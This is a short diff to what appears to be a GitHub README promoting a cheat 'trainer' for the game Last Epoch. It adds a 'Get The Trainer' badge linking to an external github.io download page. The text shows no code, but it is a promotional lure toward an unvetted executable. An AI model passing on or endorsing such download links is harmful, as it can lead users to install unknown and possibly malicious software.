@@ -4,7 +4,7 @@
 
 Last Epoch brings that classic ARPG grind: endless dungeons, loot farming, and deep skill trees. But what if you could skip the boring farm and dive straight into building overpowered characters? That’s where a **Last Epoch trainer** comes in. Trainers give you direct control over stats, skills, resources, and combat – making the game feel like your personal sandbox.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://last-epoch-trainer.github.io/.github/)
 ---
 
 ## What Is a Last Epoch Trainer?
